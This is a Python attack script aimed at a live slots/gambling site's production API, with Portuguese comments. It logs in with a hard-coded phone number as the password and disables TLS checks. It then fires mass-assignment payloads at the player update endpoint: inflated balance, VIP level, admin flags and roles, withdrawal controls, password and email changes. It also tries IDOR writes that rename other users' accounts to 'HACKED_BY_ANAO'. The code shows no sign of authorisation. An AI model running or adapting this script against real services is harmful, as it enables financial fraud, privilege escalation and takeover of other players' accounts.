"""
Exploração completa do player/update agora que sabemos:
- Token vai no BODY, não no header
- Aceita campos extras?

Testa:
1. Campos financeiros (balance, vipLevel, isAdmin, role)
2. Campos de identidade (phone, password, email)
3. IDOR: alterar outro userId (token do uid=1 + id=137027 no body)
4. Mass assignment com todos os campos do user_info
"""
import ssl, urllib.request, urllib.error, json, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

BASE  = "https://ds.amizade777.com"
PHONE = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
PKG   = "com.slots.big"
MY_UID = 137027

def login():
    payload = {"appChannel":"pc","appPackageName":PKG,"deviceId":DID,
               "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
               "sysTimezone":None,"sysLanguage":None,"phone":PHONE,"password":PHONE}
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json",
         "Content-Type":"application/json","Origin":BASE}
    r = urllib.request.Request(BASE+"/prod-api/player/sign-in",
                               data=json.dumps(payload).encode(), headers=h, method="POST")
    with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
        b = json.loads(resp.read())
        if b.get("code") != 200:
            raise RuntimeError(f"Login falhou: {b}")
        return b["data"]["token"], b["data"]["user_info"]

def call_update(token, payload):
    """Chama player/update com token NO BODY."""
    full = dict(payload)
    full["token"] = token  # token no body!
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json",
         "Content-Type":"application/json","Origin":BASE,"Referer":BASE+"/"}
    r = urllib.request.Request(BASE+"/prod-api/player/update",
                               data=json.dumps(full).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read()) if e.fp else {}
    except Exception as ex:
        return {"err": str(ex)}

def get_profile(token):
    """Pegar perfil atual pra comparar antes/depois."""
    full = {"token": token, "appPackageName": PKG}
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json",
         "Content-Type":"application/json","Origin":BASE}
    r = urllib.request.Request(BASE+"/prod-api/player/info",
                               data=json.dumps(full).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            b = json.loads(resp.read())
            return b.get("data") or {}
    except:
        return {}

# ─── Snapshot inicial ─────────────────────────────────────────

token, ui = login()
print(f"Token: {token}")
profile_before = get_profile(token)
ui2 = profile_before.get("user_info") or profile_before
print("\nPerfil antes:")
for k in ["nickname","vip_level","balance","is_admin","role","phone",
          "withdraw_control","first_rw_reward","enable","ab","recharge_amount"]:
    if k in ui2:
        print(f"  {k}: {ui2[k]!r}")

print()

# ─── Testes de mass assignment ─────────────────────────────────

TESTS = [
    ("baseline",        {"nickname": f"G{MY_UID}"}),
    ("balance",         {"balance": 999999}),
    ("vipLevel",        {"vipLevel": 99, "vip_level": 99}),
    ("isAdmin",         {"isAdmin": True}),
    ("is_admin",        {"is_admin": 1}),
    ("role_admin",      {"role": "admin"}),
    ("userType_admin",  {"userType": "admin"}),
    ("withdraw_control_1",{"withdraw_control": 1}),
    ("first_rw_reward", {"first_rw_reward": 1}),
    ("enable_0",        {"enable": 0}),
    ("ab_B",            {"ab": "B"}),
    ("recharge_amount", {"recharge_amount": 999999}),
    ("withdraw_amount", {"withdraw_amount": 0}),
    ("c_player",        {"c_player": 999}),
    ("s_player",        {"s_player": 999}),
    ("invite_user_id",  {"invite_user_id": "1"}),
    # ─── Campos de identidade ────────────────────────────────
    ("phone_change",    {"phone": "21999999999"}),
    ("email_change",    {"email": "exploit@evil.com"}),
    ("password_change", {"password": "hack3d!"}),
    ("new_password",    {"newPassword": "hack3d!"}),
    ("old_new_password",{"oldPassword": PHONE, "newPassword": "hack3d!",
                          "confirmPassword": "hack3d!"}),
    # ─── IDOR write: tentar mudar outro user via user_id no body ─
    ("idor_user_id_1",  {"user_id": 1, "nickname": "HACKED_BY_ANAO"}),
    ("idor_id_1",       {"id": 1, "nickname": "HACKED_BY_ANAO"}),
    ("idor_userId_1",   {"userId": 1, "nickname": "HACKED_BY_ANAO"}),
]

changed_fields = {}

for label, extra_payload in TESTS:
    try:
        tok, _ = login()
        b = call_update(tok, extra_payload)
        code = b.get("code")
        msg  = str(b.get("msg",""))[:60]

        # Pegar perfil após update
        tok2, _ = login()
        profile_after = get_profile(tok2)
        ui_after = profile_after.get("user_info") or profile_after

        # Comparar campos
        diffs = {}
        for field in set(list(ui2.keys()) + list(ui_after.keys())):
            before_val = ui2.get(field)
            after_val  = ui_after.get(field)
            if before_val != after_val:
                diffs[field] = {"before": before_val, "after": after_val}
                changed_fields[field] = diffs[field]

        icon = "✅" if code == 200 else "❌"
        print(f"  {icon} [{label}] code={code} msg={msg!r}")
        if diffs:
            for f, chg in diffs.items():
                if f != "nickname":  # baseline muda nickname, ignorar
                    print(f"    🔴 CAMPO MUDOU: {f}: {chg['before']!r} → {chg['after']!r}")
        if code == 200 and label not in ("baseline",) and not any(
            k in label for k in ("nickname",)):
            print(f"    → Update aceito com campos extras!")

    except Exception as ex:
        print(f"  [ERRO {label}]: {ex}")
    time.sleep(0.5)

print("\n" + "="*60)
print("RESUMO — CAMPOS QUE MUDARAM")
print("="*60)
if changed_fields:
    for field, chg in changed_fields.items():
        if field != "nickname":
            print(f"  🔴 {field}: {chg['before']!r} → {chg['after']!r}")
else:
    print("  Nenhum campo privilegiado mudou além de nickname (esperado).")

print("\n" + "="*60)
print("SNAPSHOT FINAL DO PERFIL")
print("="*60)
tok_final, _ = login()
pf = get_profile(tok_final)
ui_final = pf.get("user_info") or pf
for k, v in ui_final.items():
    print(f"  {k}: {v!r}")
